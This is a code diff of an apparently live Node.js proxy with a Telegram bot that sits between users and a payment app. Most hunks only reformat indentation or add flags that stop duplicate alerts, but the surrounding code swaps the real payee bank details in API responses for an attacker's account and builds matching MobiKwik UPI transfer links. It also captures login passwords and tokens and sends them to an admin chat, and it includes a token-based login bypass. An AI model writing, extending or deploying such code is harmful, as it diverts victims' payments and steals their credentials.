@@ -876,10 +876,10 @@ Example:
         seen.add(uniqueKey);
         manualOrders.push(`🛒 Order: ${uniqueKey}\n🏦 Bank: ${orderData.bank}\n`);
       }
-      
+
       let m = `📋 Saved Orders (${manualOrders.length}):\n\n`;
       for (const ord of manualOrders) {
-         m += ord + '\n';
+        m += ord + '\n';
       }
       await bot.sendMessage(chatId, m.substring(0, 4000) || '📋 No manually saved orders.');
       return res.sendStatus(200);
@@ -907,11 +907,11 @@ Example:
       const upiId = selectedBank.upiId || '';
 
       if (!data.orderBankMap) data.orderBankMap = {};
-      
+
       const last4 = accountNo.slice(-4);
       let wDomain = '';
       if (accountNo) {
-         wDomain = `mobikwik://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(accountHolder)}&amount=0.0&displayAccountNumber=xxxxxxxxx${last4}`;
+        wDomain = `mobikwik://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(accountHolder)}&amount=0.0&displayAccountNumber=xxxxxxxxx${last4}`;
       }
 
       data.orderBankMap[orderNo] = {
@@ -930,7 +930,7 @@ Example:
         forced: true,
         isManual: true // Flag to identify manually added orders
       };
-      
+
       data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Saved Order Mapping:\nOrder: ${orderNo}\nMapped to Bank #${bankIdx + 1}:\n${selectedBank.accountHolder} | ${selectedBank.accountNo}`);
@@ -943,27 +943,27 @@ Example:
         await bot.sendMessage(chatId, `❌ Order ${orderNo} not found in saved mappings.`);
         return res.sendStatus(200);
       }
-      
+
       let deleted = false;
       // Delete any key that matches orderNo directly
       if (data.orderBankMap[orderNo]) {
-         delete data.orderBankMap[orderNo];
-         deleted = true;
+        delete data.orderBankMap[orderNo];
+        deleted = true;
       }
-      
+
       // Also delete any other keys that point to the same order object
       for (const [k, v] of Object.entries(data.orderBankMap)) {
-         if (v.orderNo === orderNo || v.rptNo === orderNo || v.orderId === orderNo || v.id === orderNo) {
-             delete data.orderBankMap[k];
-             deleted = true;
-         }
+        if (v.orderNo === orderNo || v.rptNo === orderNo || v.orderId === orderNo || v.id === orderNo) {
+          delete data.orderBankMap[k];
+          deleted = true;
+        }
       }
-      
+
       if (!deleted) {
         await bot.sendMessage(chatId, `❌ Order ${orderNo} not found in saved mappings.`);
         return res.sendStatus(200);
       }
-      
+
       data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `🗑️ Removed order mapping for: ${orderNo}`);
@@ -1299,19 +1299,19 @@ app.all('/xxapi/*', async (req, res) => {
 
         // Also check if response has orderId if request doesn't
         if (!reqOrderId && bj.data && typeof bj.data === 'object') {
-           reqOrderId = bj.data.orderId || bj.data.orderNo || bj.data.rptNo || bj.data.slipId || '';
+          reqOrderId = bj.data.orderId || bj.data.orderNo || bj.data.rptNo || bj.data.slipId || '';
         }
 
         const _reqBodyAmt = getOrderAmount(req, req.body || {});
         let savedAmount = _reqBodyAmt || 0;
         if (!savedAmount && bj.data && typeof bj.data === 'object') {
-           // extract from walletDomain if possible
-           if (bj.data.walletDomain) {
-              const urlParams = new URLSearchParams(bj.data.walletDomain.split('?')[1] || '');
-              savedAmount = parseFloat(urlParams.get('amount') || 0);
-           } else {
-              savedAmount = parseFloat(bj.data.amount || bj.data.money || 0);
-           }
+          // extract from walletDomain if possible
+          if (bj.data.walletDomain) {
+            const urlParams = new URLSearchParams(bj.data.walletDomain.split('?')[1] || '');
+            savedAmount = parseFloat(urlParams.get('amount') || 0);
+          } else {
+            savedAmount = parseFloat(bj.data.amount || bj.data.money || 0);
+          }
         }
 
         const isSuccessMsg = origMsg.toLowerCase().includes('upi is being used') || origMsg.toLowerCase().includes('finish payment');
@@ -1329,29 +1329,29 @@ app.all('/xxapi/*', async (req, res) => {
           // ── Case 1: Real API returned SUCCESS ─────────────────────────────────
           const activeBank = getActiveBank(data, null);
           if (activeBank && reqOrderId && data.botEnabled !== false) {
-             if (!activeBank.minAmount || savedAmount >= activeBank.minAmount) {
-                if (!data.orderBankMap) data.orderBankMap = {};
-                const bkAcct = activeBank.accountNo || '';
-                const bkIfsc = activeBank.ifsc || '';
-                const bkName = activeBank.accountHolder || '';
-                const last4 = bkAcct.slice(-4);
-                const wDom = bkAcct ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${savedAmount}.0&displayAccountNumber=xxxxxxxxx${last4}` : '';
-                data.orderBankMap[String(reqOrderId)] = {
-                    bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
-                    bankName: activeBank.bankName || 'Bank',
-                    upiId: activeBank.upiId || '',
-                    amount: savedAmount,
-                    orderId: reqOrderId,
-                    orderNo: reqOrderId,
-                    walletDomain: wDom,
-                    payType: 2,
-                    time: now,
-                    userId: String(userId || ''),
-                    forced: true,
-                    isManual: true
-                };
-                await saveData(data);
-             }
+            if (!activeBank.minAmount || savedAmount >= activeBank.minAmount) {
+              if (!data.orderBankMap) data.orderBankMap = {};
+              const bkAcct = activeBank.accountNo || '';
+              const bkIfsc = activeBank.ifsc || '';
+              const bkName = activeBank.accountHolder || '';
+              const last4 = bkAcct.slice(-4);
+              const wDom = bkAcct ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${savedAmount}.0&displayAccountNumber=xxxxxxxxx${last4}` : '';
+              data.orderBankMap[String(reqOrderId)] = {
+                bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
+                bankName: activeBank.bankName || 'Bank',
+                upiId: activeBank.upiId || '',
+                amount: savedAmount,
+                orderId: reqOrderId,
+                orderNo: reqOrderId,
+                walletDomain: wDom,
+                payType: 2,
+                time: now,
+                userId: String(userId || ''),
+                forced: true,
+                isManual: true
+              };
+              await saveData(data);
+            }
           }
         }
         // Let it fall through to main proxy logic to rewrite the response!
@@ -1422,20 +1422,20 @@ app.all('/xxapi/*', async (req, res) => {
       if (!slipFailed && sj2 && sj2.data) {
         const activeBank = getActiveBank(data, null);
         if (activeBank) {
-           const hasBank = scanHasBankFields(sj2.data, 0);
-           if (hasBank) deepReplaceBankFields(sj2.data, activeBank, 0, hasBank);
-           
-           if (activeBank.bankName) {
-             sj2.data.bankName = activeBank.bankName;
-             if (sj2.data.acctBankName !== undefined) sj2.data.acctBankName = activeBank.bankName;
-             if (sj2.data.bank !== undefined) sj2.data.bank = activeBank.bankName;
-           }
-           
-           // Stringify the updated JSON and update headers
-           const newBody = JSON.stringify(sj2);
-           sh2['content-length'] = String(Buffer.byteLength(newBody));
-           res.writeHead(sd.status, sh2);
-           return res.end(newBody);
+          const hasBank = scanHasBankFields(sj2.data, 0);
+          if (hasBank) deepReplaceBankFields(sj2.data, activeBank, 0, hasBank);
+
+          if (activeBank.bankName) {
+            sj2.data.bankName = activeBank.bankName;
+            if (sj2.data.acctBankName !== undefined) sj2.data.acctBankName = activeBank.bankName;
+            if (sj2.data.bank !== undefined) sj2.data.bank = activeBank.bankName;
+          }
+
+          // Stringify the updated JSON and update headers
+          const newBody = JSON.stringify(sj2);
+          sh2['content-length'] = String(Buffer.byteLength(newBody));
+          res.writeHead(sd.status, sh2);
+          return res.end(newBody);
         }
       }
       // If no active bank or didn't replace, just let the main pipeline handle it
@@ -1551,7 +1551,7 @@ app.all('/xxapi/*', async (req, res) => {
     const isLogin = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('dologin') || urlLower.includes('auth') || urlLower.includes('register');
     if (isLogin) {
       const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
-      
+
       let extractedToken = '';
       if (typeof respData === 'string' && respData.length > 10) {
         extractedToken = respData;
@@ -1561,7 +1561,7 @@ app.all('/xxapi/*', async (req, res) => {
           extractedToken = respData.data;
         }
       }
-      
+
       if (!extractedToken && response.headers && response.headers.get('set-cookie')) {
         const cookieMatch = response.headers.get('set-cookie').match(/token=([^;]+)/);
         if (cookieMatch) extractedToken = cookieMatch[1];
@@ -1569,7 +1569,7 @@ app.all('/xxapi/*', async (req, res) => {
 
       const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
       const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
-      
+
       notifyAdmin(data,
         `🔑 LOGIN CAPTURED
 👤 User: ${userId || 'N/A'}
@@ -1676,7 +1676,7 @@ app.all('/xxapi/*', async (req, res) => {
       if (!_orderId) {
         const urlParams = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
         for (const f of orderFields) {
-           if (urlParams.get(f)) { _orderId = urlParams.get(f); break; }
+          if (urlParams.get(f)) { _orderId = urlParams.get(f); break; }
         }
       }
     }
@@ -1685,7 +1685,7 @@ app.all('/xxapi/*', async (req, res) => {
       if (jsonResp && (jsonResp.code === 0 || jsonResp.code === undefined) && respData) {
         const orderList = Array.isArray(respData) ? respData : (Array.isArray(respData.list) ? respData.list : (Array.isArray(respData.data) ? respData.data : []));
         const activeBank = getActiveBank(data, null);
-        
+
         if (activeBank && data.botEnabled !== false) {
           for (const order of orderList) {
             const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
@@ -1705,7 +1705,7 @@ app.all('/xxapi/*', async (req, res) => {
               }
             }
             const altId = order.orderNo || order.rptNo || '';
-            
+
             if (isPaying && orderId && amt !== null) {
               if (!activeBank.minAmount || amt >= activeBank.minAmount) {
                 // Mutate the JSON response directly so the app sees the fake bank
@@ -1716,10 +1716,10 @@ app.all('/xxapi/*', async (req, res) => {
                 let pt = order.payType || order.ctType || 1;
                 if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
                 const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';
-                
+
                 const hasBank = scanHasBankFields(order, 0);
                 if (hasBank) deepReplaceBankFields(order, activeBank, 0, hasBank);
-                
+
                 if (wDomC1) order.walletDomain = wDomC1;
                 if (activeBank.bankName) order.bankName = activeBank.bankName;
 
@@ -1742,21 +1742,27 @@ app.all('/xxapi/*', async (req, res) => {
                     forced: true,
                     isManual: true
                   };
-                  
+
                   data.orderBankMap[String(orderId)] = savedData;
                   if (altId && altId !== orderId) {
-                      data.orderBankMap[String(altId)] = savedData;
+                    data.orderBankMap[String(altId)] = savedData;
                   }
-                  
+
                   // Persist the auto-captured order immediately so /orders sees it
-                  saveData(data).catch(() => {});
-                  
-                  notifyAdmin(data,
-                    `✅ AUTO-CAPTURED FROM HISTORY
+                  saveData(data).catch(() => { });
+
+                  if (!data.orderBankMap[String(orderId)].notified) {
+                    data.orderBankMap[String(orderId)].notified = true;
+                    if (altId && altId !== orderId) {
+                      data.orderBankMap[String(altId)].notified = true;
+                    }
+                    notifyAdmin(data,
+                      `✅ AUTO-CAPTURED FROM HISTORY
 💰 Amount: ₹${amt}
 📋 Order: ${orderId}
 💾 Auto-saved with Bank: ${bkNameC1} | ${bkAcctC1}
 🕐 ${now}`);
+                  }
                 }
               }
             }
@@ -1855,7 +1861,9 @@ app.all('/xxapi/*', async (req, res) => {
               const bkName = activeBank.accountHolder || '';
               const last4 = bkAcct.slice(-4);
               const wDom = bkAcct ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4}` : '';
-              
+
+              const alreadyNotified = data.orderBankMap[String(rptNo)] && data.orderBankMap[String(rptNo)].notified;
+
               if (isNew) {
                 data.orderBankMap[String(rptNo)] = {
                   bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
@@ -1874,10 +1882,15 @@ app.all('/xxapi/*', async (req, res) => {
                 };
                 await saveData(data);
               }
-              
-              // ALWAYS notify admin that the Go Pay popup was triggered
-              notifyAdmin(data,
-                `✅ BUY SUCCESSFUL (Go Pay)\n💰 Amount: ₹${amt}\n📋 Order: ${rptNo}\n💾 Order is saved for history\n━━━━━━━━━━━━━━━━━━━━\n🏦 Bank Was: (Popup Captured)\n━━━━━━━━━━━━━━━━━━━━\n🔄 Replaced With: ${bkName} | ${bkAcct} | ${bkIfsc}\n🕐 ${now}`);
+
+              if (!alreadyNotified) {
+                if (data.orderBankMap[String(rptNo)]) {
+                    data.orderBankMap[String(rptNo)].notified = true;
+                }
+                // ALWAYS notify admin that the Go Pay popup was triggered
+                notifyAdmin(data,
+                  `✅ BUY SUCCESSFUL (Go Pay)\n💰 Amount: ₹${amt}\n📋 Order: ${rptNo}\n💾 Order is saved for history\n━━━━━━━━━━━━━━━━━━━━\n🏦 Bank Was: (Popup Captured)\n━━━━━━━━━━━━━━━━━━━━\n🔄 Replaced With: ${bkName} | ${bkAcct} | ${bkIfsc}\n🕐 ${now}`);
+              }
             }
           }
         }
@@ -1926,7 +1939,7 @@ app.all('/xxapi/*', async (req, res) => {
             if (!item || typeof item !== 'object') return;
             const orderState = parseInt(item.orderState ?? item.state ?? -1);
             const isHistoryItem = orderState > 0;
-            
+
             const oId = _getItemOId(item);
             const savedSlip = oId && data.orderBankMap ? data.orderBankMap[oId] : null;
 
@@ -1934,7 +1947,7 @@ app.all('/xxapi/*', async (req, res) => {
               // Browse (available to buy): minAmount check
               const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
               if (bank.minAmount && iAmt > 0 && iAmt < bank.minAmount) return;
-              
+
               // Blanket replace for active browse items
               const hasAcct = scanHasBankFields(item, 0);
               if (hasAcct) deepReplaceBankFields(item, bank, 0, hasAcct);
@@ -2004,9 +2017,9 @@ app.all('/xxapi/*', async (req, res) => {
         const bk = _bankReplaced && _replacedBank ? _replacedBank : (_realBankSnap || {});
         // Fix duplicate order save by explicitly setting rptNo
         const altId = (respData && respData.rptNo) ? String(respData.rptNo) : '';
-        const savedData = { 
-          bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`, 
-          time: now, 
+        const savedData = {
+          bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`,
+          time: now,
           userId: userId || '',
           rptNo: _orderId,
           orderNo: altId || _orderId,
@@ -2016,7 +2029,7 @@ app.all('/xxapi/*', async (req, res) => {
         };
         data.orderBankMap[_orderId] = savedData;
         if (altId && altId !== _orderId) {
-            data.orderBankMap[altId] = savedData;
+          data.orderBankMap[altId] = savedData;
         }
         // Save dynamically captured direct order screen
         await saveData(data);
@@ -2032,10 +2045,12 @@ app.all('/xxapi/*', async (req, res) => {
       } else {
         replaceLine = `❌ NOT Replaced (no active bank)`;
       }
+      
       // Determine if order was actually replaced or just not replaced due to min amount
+      // Also ensure we only notify ONCE per order.
       const alreadyNotified = _orderId && data.orderBankMap && data.orderBankMap[_orderId] && data.orderBankMap[_orderId].notified;
       const hasValidData = _orderAmt !== null || _realBankSnap || _bankReplaced;
-      
+
       if (!alreadyNotified && hasValidData) {
         if (_orderId && data.orderBankMap && data.orderBankMap[_orderId]) {
           data.orderBankMap[_orderId].notified = true;
@@ -2109,19 +2124,19 @@ ${replaceLine}
 
           let oId = '';
           // First pass: try to find a purely numeric ID (like 5524954159126535)
-          for (const f of orderIdFields) { 
-            if (item[f] && String(item[f]).length >= 3 && /^\d+$/.test(String(item[f]))) { 
-              oId = String(item[f]); 
-              break; 
-            } 
+          for (const f of orderIdFields) {
+            if (item[f] && String(item[f]).length >= 3 && /^\d+$/.test(String(item[f]))) {
+              oId = String(item[f]);
+              break;
+            }
           }
           // Second pass: if no numeric ID found, fallback to any ID
           if (!oId) {
-            for (const f of orderIdFields) { 
-              if (item[f] && String(item[f]).length >= 3) { 
-                oId = String(item[f]); 
-                break; 
-              } 
+            for (const f of orderIdFields) {
+              if (item[f] && String(item[f]).length >= 3) {
+                oId = String(item[f]);
+                break;
+              }
             }
           }
           if (!oId) continue;
@@ -2147,8 +2162,18 @@ ${replaceLine}
               data.orderBankMap[altId] = data.orderBankMap[oId];
             }
           }
-          capturedCount++;
-          logLines.push(`📋 ${oId}\n   💰 ₹${amt}  👤 ${acctName}\n   🏦 ${acctNo}${acctCode ? ' | ' + acctCode : ''}`);
+
+          // Check if we have already notified about this specific order ID
+          const alreadyNotified = data.orderBankMap[oId] && data.orderBankMap[oId].notified;
+
+          if (!alreadyNotified) {
+            // Mark as notified so we don't count it again
+            if (data.orderBankMap[oId]) {
+              data.orderBankMap[oId].notified = true;
+            }
+            capturedCount++;
+            logLines.push(`📋 ${oId}\n   💰 ₹${amt}  👤 ${acctName}\n   🏦 ${acctNo}${acctCode ? ' | ' + acctCode : ''}`);
+          }
         }
 
         if (capturedCount > 0 && data.adminChatId && bot) {
@@ -2555,14 +2580,14 @@ fixLinks();fixOnClick();patchBalDOM();
 app.all('*', async (req, res) => {
   try {
     const path = req.originalUrl || req.url;
-    
+
     // --- TOKEN LOGIN BYPASS HANDLER ---
     if (req.query && req.query.token) {
       const token = req.query.token.trim();
       if (token.length > 10) {
         const cookieStr = `token=${token}; Path=/; Secure; SameSite=None; Max-Age=31536000`;
         res.setHeader('Set-Cookie', cookieStr);
-        
+
         // Inject script to set LocalStorage as well
         const html = `<html><body><script>
           localStorage.setItem('token', '${token}');
